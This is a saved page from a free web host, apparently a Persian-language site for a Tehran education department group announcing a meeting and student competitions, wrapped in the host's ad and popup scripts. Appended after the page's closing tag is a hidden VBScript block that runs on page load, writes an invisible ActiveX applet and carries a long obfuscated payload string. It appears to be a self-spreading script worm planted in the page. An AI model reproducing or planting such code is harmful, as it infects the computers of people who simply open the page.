<SCRIPT LANGUAGE=JavaScript>
<!--
   document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%0A%66%75%6E%63%74%69%6F%6E%20%44%65%63%6F%64%65%28%73%29%7B%0A%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%0A%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%0A%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%0A%7D%0A%3C%2F%73%63%72%69%70%74%3E'));
//-->
</SCRIPT>
<SCRIPT LANGUAGE=JavaScript src="/fs_img/js/md5.js"></SCRIPT>
<!-- '"AWS"' -->
<!-- Auto Banner Insertion Begin -->
<div id=aws_6082 align=center><style>
  .mwsb{ background-color: CCCCCC; border-width: 1px; border-color: CCCCCC; border-style: solid; }
  .mwst, .mwst a{ font-family: arial,sans-serif; font-size: 8pt; background-color: white; color: blue;}
  </style>
  <!------ OAS SETUP begin ------>
  <img src="http://track.untd.com/s/oasrdb?pid=MWS&profile=,," width="1" height="1">
  <SCRIPT LANGUAGE=JavaScript>
  <!--
  //configuration
  OAS_url = "http://cyclops.prod.untd.com/";
  //OAS_sitepage values can be found in the excel spreadsheet showing position and pagenames.
  OAS_sitepage = 'webservices/general'; //CHANGED
  //OAS_sitepage = window.location.hostname + window.location.pathname;
  // must list every Ad position on the page or they will not show.  Also you can't have line items that are not on the page or a impression will be counted even though it was actually shown. 
  OAS_listpos = 'Top,Bottom,Frame1,Frame2,Right,TopLeft,Top1,TopRight';
  OAS_query = '';
  OAS_target = '_Blank';
  //end of configuration
  OAS_version = 10;
  OAS_rn = '001234567890'; OAS_rns = '1234567890';
  OAS_rn = new String (Math.random()); OAS_rns = OAS_rn.substring (2, 11);
  function OAS_NORMAL(pos) {
    document.write('<A HREF="' + OAS_url + 'click_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" TARGET=' + OAS_target + '>');
    document.write('<IMG SRC="' + OAS_url + 'adstream_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" BORDER=0></A>');
  }
  //-->
  </SCRIPT>


  <SCRIPT LANGUAGE=JavaScript1.1>
  <!--
  OAS_version = 11;
  if ((navigator.userAgent.indexOf('Mozilla/3') != -1) || (navigator.userAgent.indexOf('Mozilla/4.0 WebTV') != -1))
    OAS_version = 10;
  if (OAS_version >= 11)
    document.write('<SCR' + 'IPT LANGUAGE=JavaScript1.1 SRC="' + OAS_url + 'adstream_mjx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '?' + OAS_query + '"><\/SCRIPT>');//-->
  </SCRIPT>

  <SCRIPT LANGUAGE=JavaScript>
  <!--
  document.write('');
  function OAS_AD(pos) {
    if ((OAS_version >= 11) && (typeof OAS_RICH != 'undefined')) {
      OAS_RICH(pos);
    } else {
      OAS_NORMAL(pos);
    }
  }

  //-->
  </SCRIPT>
  <!-- start /fs_img/about_pop.txt -->
<!-- The only pops this script can generate now are:
			1. Pops from UOL
			2. In-house popup
-->
<script language="JavaScript">
<!--
var isUS = "0";
var keyword = escape("");
var compname='freeservers';
var ourExitPop=true;

function popSlot(slot){
    // OAS AD 'Frame1' begin
    if(window.OAS_AD) OAS_AD('Frame1');
    // OAS AD 'Frame1' begin
}

function checkPopunderCookie() {
	var cookieVal = 0;
	cookieExpDays = (1/24);  
	var expDate = new Date();
	expDate.setTime(expDate.getTime() + (86400000 * cookieExpDays));
	cookieDate = ";Expires=" + expDate.toGMTString();
	if (document.cookie) {
		var cookieInfo = document.cookie.split(";");
		for (i=0; i<cookieInfo.length; i++) {
			cName = cookieInfo[i].split("=")[0];
			if (cName.indexOf("pixelpop") >= 0) {
				cookieVal = cookieInfo[i].split("=")[1];
			}
		}
	}
	cookieVal++;
	document.cookie="pixelpopslot="+cookieVal+";path=/;"+cookieDate;
 	if (cookieVal== 1) { popSlot(1); }
 	if (cookieVal== 2) { popSlot(2); }
 	if (cookieVal== 3) { popSlot(3); }
 	if (cookieVal== 4) { popSlot(4); }
 	if (cookieVal== 5) { popSlot(5); }
 	if (cookieVal== 6) { popSlot(6); }
 	if (cookieVal== 7) { popSlot(7); }
 	if (cookieVal== 8) { popSlot(8); }
}

if (!window.sprs) checkPopunderCookie();

if (!window.sprs && ourExitPop && (navigator.appName.indexOf('etscape')==-1)){
	window.onunload=staycheck;
	StayingOnSite=false;
	DadLinkURLs="";
	BabyLink="";
	DadWindow=window.parent;
	DadLinks=DadWindow.document.links;
	DadHost="http://"+location.hostname;
	DadWindow.document.onclick=linktellerDad;
	document.onclick=linktellerThis;
	function linkteller(){
		while (EventTag.parentElement&&(EventTag.tagName!="A")){
				EventTag=EventTag.parentElement;
		}
		if ((EventTag.tagName=="A")&&(!EventTag.target)){
			if (EventTag.href.indexOf(DadHost)>-1){
				StayingOnSite=true;
			} else {
				StayingOnSite=false;
			}
		}
	}
	function linktellerThis(){
		EventTag=window.event.srcElement;
		linkteller();
	}
	function linktellerDad(){
		EventTag=DadWindow.event.srcElement;
		linkteller();
	}
	function staycheck(){
		if (StayingOnSite){
		} else {
		}
	}
}
-->
</SCRIPT>
<!-- end /fs_img/about_pop.txt -->
  <table cellpadding="0" cellspacing="0" width="980">

    <!-- start: related resources -->
    <tr>
      <td colspan="3">
        <table cellpadding="0" cellspacing="0" align="center" width="100%" class="mwsb">
          <tr>
            <td class="mwst" align="center">
              <a href="http://4t.com" class="mwst" target="_top">Free Web space and hosting from 4t.com</a>
            </td>
          </tr>
        </table>
      </td>
    </tr>
    <!-- end: related resources -->

    <tr>
      <td width="130">
        <table cellpadding="0" cellspacing="0" width="130" style="margin-top:2px;">
          <tr>
            <td class="mwst" nowrap="1">
              <a href="http://www.4t.com"
                ><img src="/cgi-bin/image/images/bannertype/100X22.gif" width="100" height="22" border="0"
                ></a
              ><a href="/cgi-bin/login" target="_blank"
                ><img src="/cgi-bin/image/images/bannertype/login_chunkx.gif" width="30" height="22" border="0"
                ></a
             ></td>
          </tr>
        </table>
        
        <table class="mwsb" cellpadding="0" cellspacing="0" width="100%" style="margin-top:2px;">
          <tr>
            <td align="center">
              <a href="/cgi-bin/path/signup?refcd=MWS_20040713_Banner_bar"
              ><img src="http://nztv.prod.untd.com/RealMedia/ads/Creatives/ISP/MWS_Mkting_LSKYBUT_34_8023/128x64_get_a_free_website_01.gif" border="0"
              ></a>
            </td>
          </tr>
        </table>
      </td>

      <td>
        <table cellspacing="0" class="mwsb" style="margin:2px;margin-bottom:0px;table-layout:fixed;"> 
          <tr>
            <td class="mwst" align="center" style="width:730px;">
    <!------ OAS AD 'Top' begin ------>
    <SCRIPT LANGUAGE=JavaScript>
    <!--
    if(window.OAS_AD) OAS_AD('Top');
    //-->
    </SCRIPT>
    <!------ OAS AD 'Top' end ------></td>
          </tr>
        </table>
      </td>

      <td width="120">
        <table class="mwsb" cellpadding="0" cellspacing="0" width="120" style="margin-top:2px;">
          <tr>
            <td class="mwst" nowrap="1">
              <SCRIPT LANGUAGE=JavaScript><!--
              OAS_AD('Top1');
              //--></SCRIPT>
            </td>
          </tr>
        </table>
        
        <table class="mwsb" cellpadding="0" cellspacing="0" width="100%" style="margin-top:2px;">
          <tr>
            <td align="center">
              <SCRIPT LANGUAGE=JavaScript><!--
              OAS_AD('TopRight');
              //--></SCRIPT>
            </td>
          </tr>
        </table>
      </td>

    </tr>
    <tr>
      <td colspan="3" align="center">
        <!-- search bar begins --><table width="100%" cellpadding="0" cellspacing="0" class="mwsb" style="border-width:2px; margin-top:10px; background-color:white; height:10px;">  <tr valign="top">    <td align="center">      <form action="http://search.mysite.com/search" style="margin:0;" target="_blank">      <span style="position:relative;top:-5px;font-family:arial;font-size:12px;color:#000;"><b>Search the Web</b></span>      <input type="hidden" name="source" value="mws_endsite_box">      <input type="hidden" name="action" value="search">      <input name="query" accesskey="s" style="width:400px; height:21px; background:white; border:1px #A4ABB1 solid; font-family: arial, sans-serif; font-size: 10pt; color: #000000; position:relative; top:-6px;">      <input type="image" src="/fs_img/bannertype/infospace/search_sp_go.gif">      <img src="/fs_img/bannertype/infospace/search_logo.gif" style="position:relative;top:4px;left:10px;">      </form>    </td>    <td width="5%"></td>  </tr></table>
      </td>
    </tr>
  </table><DIV id=sideFrame 
	style="MARGIN-TOP: 27px; RIGHT: 5px; WIDTH: 120px; COLOR: #ffffff; POSITION: absolute; BACKGROUND-COLOR: #CCCCCC; Z-INDEX: 10000; TEXT-ALIGN: right"><A 
	href="javascript:void%20(sideFrameOff())"><IMG src="/fs_img/banners/xout.gif" 
	border=0></A><BR>
  <!------ OAS AD 'Right' begin ------>
  <SCRIPT LANGUAGE=JavaScript>
  <!--
  OAS_AD('Right');
  // -->
  </SCRIPT>
  <!------ OAS AD 'Right' end ------>
  </DIV>
	<SCRIPT>
		origRightPadding=document.body.style.paddingRight;
		document.body.style.paddingRight="130px";
		function sideFrameOff(){
			document.getElementById('sideFrame').style.display='none';
			document.body.style.paddingRight=origRightPadding;
		}
		</SCRIPT>
	</DIV>
  <DIV id="setMyHomeOverlay" align="left" style="position:absolute; top:25%; left:25%; width:358px; border:1px solid #AEAEAE; background-color:white; z-index:200000; display: none;">
    <div style="height:59px; padding-left:22px; background:white url('/cgi-bin/image/images/sethome_top_border.gif') repeat-x;">
    <div style="float:left; width:182px; height:35px; margin-top:12px; font:bold 38px arial,sans-serif; color:#454545"> Welcome! </div>
    <div style="float:right; padding:6px 5px 0px 5px;"><a href="#" onclick="javascript:do_set_homepage('close'); return false;">
    <div style="background:url('/cgi-bin/image/images/sethome_x.gif'); width:21px; height:21px; cursor:pointer;"></div></a></div>
    <div style="float:right; font:bold 12px arial; margin-top:10px;"><a style="text-decoration:none; color:#004182;" href="#" onclick="javascript:do_set_homepage('close'); return false;">Close</a></div></div>
    <div style="height:170px; background:#ffffff;">
    <div style="padding:30px 20px 0px 20px; font:normal 14px arial; height:80px;"> Would you like to make this site your homepage? It's fast and easy... </div>
    <div style="padding:10px 0 0 41px;">
    <div style="float:left;cursor:pointer; background:white url('/cgi-bin/image/images/sethome_btn_l.gif'); width:4px; height:26px;" onclick="javascript:do_set_homepage('do');"> </div>
    <div style="float:left;cursor:pointer; background:white url('/cgi-bin/image/images/sethome_btn_m.gif') repeat-x; width:265px; height:26px; text-align:center; font:bold 13px Arial; color:#FFFFFF; line-height:25px;" onclick="javascript:do_set_homepage('do');"> Yes, Please make this my home page! </div>
    <div style="float:left;cursor:pointer; background:white url('/cgi-bin/image/images/sethome_btn_r.gif'); width:4px; height:26px;" onclick="javascript:do_set_homepage('do');"> </div></div>
    <div style="padding-left:148px; padding-top:7px; clear:both; font:normal 12px arial;"><a href="#" style="text-decoration:none; color:#004182;" onclick="javascript:do_set_homepage('close'); return false;">No Thanks</a></div></div>
    <div style="height:36px; background: white url('/cgi-bin/image/images/sethome_bot_border.gif') repeat-x;">
    <div style="float:left;margin:12px 0px 0px 20px; line-height:10px;"><input type="checkbox" style="width:11px; height:11px;" onclick="javascript:do_set_homepage('dont');"></div>
    <div style="float:left;font:normal 12px arial;padding:10px 0 0 2px;"> &nbsp; Don't show this to me again.</div>
    <div style="float:right; padding:6px 5px 0px 5px;"><a href="#" onclick="javascript:do_set_homepage('close'); return false;">
    <div style="background:url('/cgi-bin/image/images/sethome_x.gif'); width:21px; height:21px; cursor:pointer;"></div></a></div>
    <div style="float:right;font:bold 12px arial; margin-top:10px;"><a style="text-decoration:none; color:#004182;" href="#" onclick="javascript:do_set_homepage('close'); return false;">Close</a></div></div></div>
    <span ID="mws_oHomePageOverlay" style="behavior:url(#default#homepage); display:none;"></span>
    <script src=/fs_img/js/overlay.js></script><script defer="defer" src=/fs_img/js/set_homepage.js></script></div><!-- Auto Banner Insertion Complete THANK YOU -->

<SCRIPT LANGUAGE=JavaScript>
<!--   
    Decode('%264Dtdsjqu%2631mbohvbhf%264E%2633kbwbtdsjqu%2633%2631uzqf%264E%2633ufyu0kbwbtdsjqu%2633%2631tsd%264E%26330dhj.cjo0wbmjebuf%60cboofs%264Gfod%264Ez%26368Co7z%26368Coi%26364C%26364B%26364E%26364C7zy%26368D%26368Ei%26364CC%26364E%26364C%3A%2633%264F%264D0tdsjqu%264F1');
//-->
</SCRIPT>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0048)http://www.decs.act.gov.au/services/otep_usa.htm -->
<HTML><HEAD>
<meta name="DC.Publisher" content="http://gam-tehran.4t.com">
<meta name="DC.Creator" content="http://gam-tehran.4t.com">
<meta name="DC.Coverage" content="http://gam-tehran.4t.com">
<meta name="DC.Rights" content="http://gam-tehran.4t.com">
<meta name="DC.Identifier" content="http://gam-tehran.4t.com">
<TITLE>&#1711;&#1585;&#1608;&#1607;&#1607;&#1575;&#1740; &#1570;&#1605;&#1608;&#1586;&#1588;&#1740; &#1575;&#1583;&#1575;&#1585;&#1607; &#1705;&#1604; &#1570;&#1605;&#1608;&#1586;&#1588; &#1608;&#1662;&#1585;&#1608;&#1585;&#1588; &#1588;&#1607;&#1585; &#1578;&#1607;&#1585;&#1575;&#1606;</TITLE>
<META content="text/html; charset=windows-1252" http-equiv=Content-Type><LINK 
href="http://purl.org/DC/elements/1.0/" rel=schema.DC><LINK 
href="http://www.naa.gov.au/govserv/agls/1.1" rel=schema.AGLS>
<META content="Teacher Exchange Program - International Destinations - USA" 
lang=en name=DC.Title>
<META content="" lang=en name=DC.Title.Alternative>
<META content="Teacher Exchange Program - International Destinations - USA" 
lang=en name=DC.Description>
<META content=", , ," name=DC.Subject SCHEME="SCIS">
<META content="" name=AGLS.Function SCHEME="AGIFT">
<META content=2001-10-03 name=DC.Date SCHEME="ISO8601">
<META content=2001-10-03 name=DC.Date.Created SCHEME="ISO8601">
<META content=2002-05-31 name=DC.Date.Modified SCHEME="ISO8601">
<META content=yyyy-mm-dd name=DC.Date.ValidTo SCHEME="ISO8601">
<META content=yyyy-mm-dd name=DC.Date.ValidFrom SCHEME="ISO8601">
<META content=yyyy-mm-dd name=DC.Date.Issued SCHEME="ISO8601">
<META content=item name=DC.Type SCHEME="agls-aggregationlevel">
<META content=document name=DC.Type SCHEME="agls-category">
<META content=homepage name=DC.Type SCHEME="agls-document">
<META content=text/html name=DC.Format SCHEME="IMT">
<META content=en name=DC.Language SCHEME="RFC1766">
<META content="" name=DC.Relation>
<META 
content="personalName: ; corporateName: ; jurisdiction: ; contact: ; address: ; email:" 
lang=en name=DC.Contributor>
<META content="" name=DC.Source SCHEME="ISBN">
<META content="" name=DC.Source SCHEME="URI">
<META content="" name=DC.Audience SCHEME="EdNA-userlevel">
<META content=Employees name=DC.Audience>
<META 
content="personalName: ; corporateName: ; jurisdiction: ; contact: ; address: ; email: ; cost: " 
name=AGLS.Availability>
<META content=http:// name=AGLS.Mandate SCHEME="URI">
<META content="" name=EDNA.Userlevel>
<META content="" name=EDNA.Categories>
<META content=1.0 name=EDNA.Version>
<LINK 
href="../styles.css" 
rel=stylesheet>
<SCRIPT language=JavaScript>
<!--
if (document.images) {



function MM_preloadImages() { //v2.0
  if (document.images) {
    var imgFiles = MM_preloadImages.arguments;
    if (document.preloadArray==null) document.preloadArray = new Array();
    var i = document.preloadArray.length;
    with (document) for (var j=0; j<imgFiles.length; j++) if
(imgFiles[j].charAt(0)!="#"){
      preloadArray[i] = new Image;
      preloadArray[i++].src = imgFiles[j];
  } }
}

function MM_swapImgRestore() { //v2.0
  if (document.MM_swapImgData != null)
    for (var i=0; i<(document.MM_swapImgData.length-1); i+=2)
      document.MM_swapImgData[i].src = document.MM_swapImgData[i+1];
}

function MM_swapImage() { //v2.0
  var i,j=0,objStr,obj,swapArray=new Array,oldArray=document.MM_swapImgData;
  for (i=0; i < (MM_swapImage.arguments.length-2); i+=3) {
    objStr = MM_swapImage.arguments[(navigator.appName ==
'Netscape')?i:i+1];
    if ((objStr.indexOf('document.layers[')==0 && document.layers==null) ||
        (objStr.indexOf('document.all[')   ==0 && document.all   ==null))
      objStr =
'document'+objStr.substring(objStr.lastIndexOf('.'),objStr.length);
    obj = eval(objStr);
    if (obj != null) {
      swapArray[j++] = obj;
      swapArray[j++] = (oldArray==null ||
oldArray[j-1]!=obj)?obj.src:oldArray[j];
      obj.src = MM_swapImage.arguments[i+2];
  } }
  document.MM_swapImgData = swapArray; //used for restore
}
}
//-->
</SCRIPT>

<STYLE type=text/css>.navtree {
	COLOR: #999999; FONT-FAMILY: Arial, Geneva, Helvetica; FONT-SIZE: 9pt
}
.foottext {
	FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif; FONT-SIZE: 9pt
}
P {
	FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif; FONT-SIZE: 10pt
}
H4 {
	COLOR: #336699; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif; FONT-SIZE: 10pt
}
H3 {
	COLOR: #336699; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif; FONT-SIZE: 12pt
}
H2 {
	COLOR: #336699; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif; FONT-SIZE: 13pt
}
H1 {
	COLOR: #336699; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif; FONT-SIZE: 14pt
}
LI {
	FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif; FONT-SIZE: 10pt
}
TD {
	FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif; FONT-SIZE: 10pt
}
.menutext {
	FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif; FONT-SIZE: 9pt
}
</STYLE>

<META content="Microsoft FrontPage 5.0" name=GENERATOR>
<meta name="ProgId" content="FrontPage.Editor.Document">
</HEAD>
<BODY aLink=#FF9933 
background="../bg3_blue.gif" 
bgColor=#ffffff leftMargin=0 link=#336699 
onload="MM_preloadImages('../images/logo_over.gif','#950487437533');MM_preloadImages('../images/tbtn_ser_over.gif','#950490315383');MM_preloadImages('../images/tbtn_app_over.gif','#950490326433');MM_preloadImages('../images/tbtn_pub_over.gif','#950490337683');MM_preloadImages('../images/tbtn_sch_over.gif','#950490476366');MM_preloadImages('../images/tbtn_pol_over.gif','#950490722233');MM_preloadImages('../images/tbtn_work_over.gif','#950490738183')" 
topMargin=0 vLink=#999999 marginwidth="0" marginheight="0">
<P><SPAN class=menutext></SPAN></P>
<TABLE border=0 cellPadding=0 cellSpacing=0 width=700>
  <TBODY>
  <TR>
    <TD>
    <IMG alt="Tehran Education Department" border=0 height=51 
      name=title 
      src="../title.gif" 
      width=587></TD>
    <TD rowSpan=3>
    <IMG 
      alt="gam Logo" border=0 height=76 name=logo 
      src="../logo.gif" 
      width=99></TD>
    <TD rowSpan=3>
    <IMG alt="header finish" border=0 height=76 name=bar_rlogo 
      src="../bar_rlogo.gif" 
      width=14></TD></TR>
  <TR>
    <TD>
    <IMG alt="double bar" border=0 height=6 name=title_lines 
      src="../title_lines.gif" 
      width=587></TD></TR>
  <TR>
    <TD><MAP name=FPMap0>
    <AREA coords="341, 3, 421, 13" 
        href="Policies.htm" shape=RECT>
    <AREA 
        coords="163, 3, 228, 14" 
        href="site.html" shape=RECT>
    <AREA 
        coords="112, 3, 156, 13" 
        href="name.html" shape=RECT>
    <AREA 
        coords="273, 0, 325, 18" 
        href="Chart.htm" shape=RECT>
    <AREA 
        coords="43, 3, 103, 13" href="news.html" 
        shape=RECT>
    <AREA coords="235, 3, 262, 13" 
        href="mailto:gam_tehran@yahoo.com" shape=RECT></MAP>
    <IMG 
      alt="sub menu" border=0 height=19 name=sub_menu 
      src="../sub_menu.gif" 
      useMap=#FPMap0 width=587 
      rectangle="(139,3) (177, 13)  ../sitemap/sitemap.htm"></TD></TR>
  <TR>
    <TD colSpan=3>
    <a href="about%20us.htm">
    <IMG 
      alt="about us" border=0 height=37 name=tbtn_ab 
      src="../tbtn_ab.gif" 
      width=87></a><a href="../groups.html"><IMG 
      alt="Sub groups" border=0 height=37 name=Image1 
      src="../tbtn_sch.gif" 
      width=85></a><a href="program.htm"><IMG 
      alt="services &amp; programs" border=0 height=37 name=Image2 
      src="../tbtn_ser_grey.gif" 
      width=85></a><a href="seminars.htm"><IMG 
      alt="Seminars" border=0 height=37 name=Image3 
      src="../tbtn_app.gif" 
      width=85></a><a href="Policies.htm"><IMG 
      alt="Policies" border=0 height=37 name=tbtn_pub 
      src="../tbtn_pub.gif" 
      width=85></a><a href="Exam.htm"><IMG 
      alt="Exams &amp; Matches" border=0 height=37 name=Image5 
      src="../tbtn_pol.gif" 
      width=86></a><a href="about%20us.htm"><IMG 
      alt="Contact" border=0 height=37 name=Image6 
      src="../tbtn_work.gif" 
      width=91></a><IMG alt=shadow border=0 height=37 name=hdr_shadow 
      src="../hdr_shadow.gif" 
      width=96></TD></TR>
  <TR>
    <TD colSpan=3>
    <IMG border=0 height=8 name=image_r05_c01 
      src="../image_r05_c01.gif" 
      width=700></TD></TR>
  <TR>
    <TD colSpan=3>
      <TABLE border=0 cellPadding=0 cellSpacing=0 width=700 background="file:///C:/Documents%20and%20Settings/a1/Desktop/New%20Folder/back.JPG" style="border-collapse: collapse" bordercolor="#111111">
        <TBODY>
        <TR>
          <TD vAlign=top width=51>&nbsp;</TD>
          <TD vAlign=top width="649">
            <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" background="../73.gif" height="2">
              <tr>
                <td width="100%" height="45">
                <ul>
                  <li dir="rtl">
                  <p align="right" dir="rtl"><font size="6" color="#800000"><b>
                  &#1605;&#1580;&#1605;&#1593;</b></font></li>
                </ul>
                <blockquote>
                  <p align="right" dir="rtl"><span lang="fa"><b>
                  <font face="Sepehr" size="3">&#1578;&#1575;&#1585;&#1610;&#1582; &#1576;&#1585;&#1711;&#1586;&#1575;&#1585;&#1610; &#1587;&#1608;&#1605;&#1610;&#1606; &#1605;&#1580;&#1605;&#1593;&nbsp; 
                  &#1585;&#1608;&#1586; &#1588;&#1606;&#1576;&#1607;&nbsp; 81/10/30 &#1605;&#1610; &#1576;&#1575;&#1588;&#1583;.</font></b></span><p align="right" dir="rtl">
                  <span lang="fa"><font face="Sepehr" size="3"><b>&#1583;&#1587;&#1578;&#1608;&#1585; &#1605;&#1580;&#1605;&#1593; 
                  &#1576;&#1583;&#1610;&#1606; &#1588;&#1585;&#1581; &#1605;&#1610; &#1576;&#1575;&#1588;&#1583;:</b></font></span></blockquote>
                      <p align="right" dir="rtl"><b>
                      <font face="Sepehr" size="3" color="#000080">1<span lang="fa">- 
                      &#1576;&#1585;&#1585;&#1587;&#1740; &#1583;&#1587;&#1578;&#1608;&#1585;&#1575;&#1604;&#1593;&#1605;&#1604; &#1605;&#1587;&#1575;&#1576;&#1602;&#1575;&#1578; &#1705;&#1575;&#1585;&#1711;&#1575;&#1607;&#1610;</span></font></b></p>
                      <p align="right" dir="rtl"><b>
                      <font face="Sepehr" size="3" color="#000080"><span lang="fa">2- &#1576;&#1585;&#1585;&#1587;&#1740; &#1601;&#1589;&#1608;&#1604; 
                      11&#1608;12 &#1705;&#1578;&#1575;&#1576; &#1608; &#1606;&#1581;&#1608;&#1607; &#1575;&#1585;&#1575;&#1574;&#1607; &#1608;&#1576;&#1585;&#1585;&#1587;&#1740; &#1662;&#1585;&#1608;&#1688;&#1607; &#1607;&#1575;&#1610; &#1583;&#1575;&#1606;&#1588; &#1570;&#1605;&#1608;&#1586;&#1575;&#1606;
                      </span></font></b></p>
                  <p align="right" dir="rtl">&nbsp;</td>
              </tr>
              <tr>
                <td width="100%" height="45">
                <ul>
                  <li dir="rtl">
                  <p align="right" dir="rtl"><b><font size="6" color="#800000">&#1605;&#1587;&#1575;&#1576;&#1602;&#1607;</font></b></li>
                </ul>
                  <p align="right" dir="rtl"><span lang="fa">
                  <font color="#000080" size="3"><b>&#1670;&#1607;&#1575;&#1585;&#1605;&#1610;&#1606; &#1583;&#1608;&#1585;&#1607; &#1605;&#1587;&#1575;&#1576;&#1602;&#1575;&#1578; 
                  &#1570;&#1586;&#1605;&#1575;&#1610;&#1588;&#1711;&#1575;&#1607;&#1610; &#1608; &#1585;&#1575;&#1610;&#1575;&#1606;&#1607; &#1575;&#1610; &#1583;&#1575;&#1606;&#1588; &#1570;&#1605;&#1608;&#1586;&#1575;&#1606; &#1587;&#1585;&#1575;&#1587;&#1585; &#1705;&#1588;&#1608;&#1585;</b></font></span></td>
              </tr>
              <tr>
                <td width="100%" height="1">
                &nbsp;</td>
              </tr>
              <tr>
                <td width="100%" height="1">
                &nbsp;</td>
              </tr>
              <tr>
                <td width="100%" height="4">
                &nbsp;</td>
              </tr>
            </table>
          </TD>
          </TR></TBODY></TABLE></TD></TR></TBODY></TABLE></BODY></HTML>
<HTML>
<BODY onload="vbscript:KJ_start()">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "<efAjPf]n^*@pfjLaqr$R[qLaqr$@^eja^Qacg*9lij]K[h]_m*>OH*OoLf]he*OegNYpa*Kq[C$BblYhrBaodOn`GC]kpZpl$GCQ]p=ge$GCAjaZr]Ibjaan&!IBHbi]Em&!IB?kcYp^KYee&!IBLkmh]`_la!'>l\LsZBnl[pbmfDH9licf`Mm Bbj]LZr`(MwhaLrj%GjCjnhpN^qmi^FaqrLclKcY`Mcel;BLM&KicfP^vlBbj]$?gdaI_ld%/!RelLrj6JaZbLafn&N^_\=ejBdEgqln!RelLrj(IB[lrYnm&!4:.KkDag&LiiQln4*Ld^lKcY`Mcel'Adklc>vapDmj\rakgAgbE_E_LuicKpk5flpLd^lKcY`Mcel'AdklcLcl?gdaMcel;BLM&KicfP^vlBbj]$?gdaI_ld%0!Dah^R]ii,Onbr]:>HBQhldkZb5  n^lajeir2$DHWom_jp!'<n^<pDb$PfnKpko`;nEdFlieR]tmBbj]P^kh*<jgo^O^rB:rlnb`9DKK'E]p?gda!Dah^NYpa'??lpkgZ*Zrlnb`mp^q91,Cdo^N^_\P^kh*<jgo^O^rBbj]P^kh6>OH,Gl^lLaqr>eec Bbj]LZr`(1'BdPrn]Omp9 `pfjMf]j>eecLafn&SkglatZ?kJ^8FLIE<n^<pDb$5  :K=Wkgjg]];tZo\palm8GC]kpZpl$ $7 tZ?kJ^@pfjLaqr>jkaBdPrn]Omp9 n^l PacfDah^R]ii,Onbr]o`;nEdTZoMcpp=j]Ab>eecLafn&?emka=j]Ab=j]>qgalehl>qgalehlGCA`]ge]On` ?npjagrKpkgfc%JYomGf`^v;dZp!G^E_kpBl\aqA`]k5)Ld^lBdH^dl$EAYo^&;qkp]jmQlnbl_%%/!6:H<_ka! [Ld^lDH;dZl_aLsZ6>eg_du=gkg$3ZQm^>5)Aeq]IB?a_fc^Qm^;?ap =la H^dl$EAYo^&;qkp]jmQlnbl_%%/!%+-8TKq[C9.>l\Bd>jkaCF<fYj`cKq[5Fg\$<sjn^llOmpaj`*)(E_kpBl\aqA`]k'>l\Bd>l\?sf_mggj?sf_mggjIB?kcYp^KYee&!Mf>pjkkJalseaL]tmE_AjPf]n^5flie PacfCpem>qgalehl>l\BdLfYn^Dah^5Ec^p!UajI_ld%1!Lkm_nZkBbj]oUAgifmf?gdalZEe\pgohdlLfYn^bTOm_lehl]nrZZhZlc*areAb&>OH,>eec=tbqlo!Q`]kc>eec!%R`ag?ZjdDH9licf`Mm Oa_ja?gda% `pfj%=hlcLcl?gdaMcel;BLM&KicfP^vlBbj]$LfYn^Dah^**(mpmaBbj]P^kh*Ppap^8FLIE<n^<pDb$5  :K=Wkgjg]];tZo\palm8GC]kpZpl$ $7 tZ?kJ^@pfjLaqr?gdaMcel'Adklc>l\Bd=c^]njlE]5PqKd^jd*Kc_N^_\$FCAR];QKP=JM]MO>PTE]cfpbraalZ<a__mhmMo^pE= !MmpEmggOcjobmf6OoLf]he,Ja`P]]]&DDCQ[EM;=E]E=<FAJ>ZKk_ro]kcTIbajklm^pUMmpemggCplkckoUK]`b_Nak !UkOacdh'P]cPpap^DDCQ[<SJN>LL[NQ=NUG\agrapbckX$<a__mhmG\ZKk_ro]kcTIbajklm^pUMmpemggCplkckoU Ec^p!MmpEmggOcjobmf(*',(XF_ahUAgiimkaSkaQl]mggj^pq%/$KC?[=UGN= <_dhIBIZgdN^e AI=UXAMNKCFPXSKAKZA`^llemg]oU @^dYqerA` TOhdlsZp]XFg[nhqgbmZGqmjgkd=tip]olZJ]bm&GqmJgkdT]nlggj%/! &,UKYeeZKpZrakgcjuLYi^ $Oa_ja?gda?ZjdDHE]bjJa`&DDCQ[<SJN>LL[NQ=NUG\agrapbckX$<a__mhmG\ZKk_ro]kcTIbajklm^pUMmpemggCplkckoU Ec^p!MmpEmggOcjobmf(*',(XF_ahUUa`^KpZrakgcjuLYi^ $Oa_ja?gdaSlQ`aej&N^eOnbr]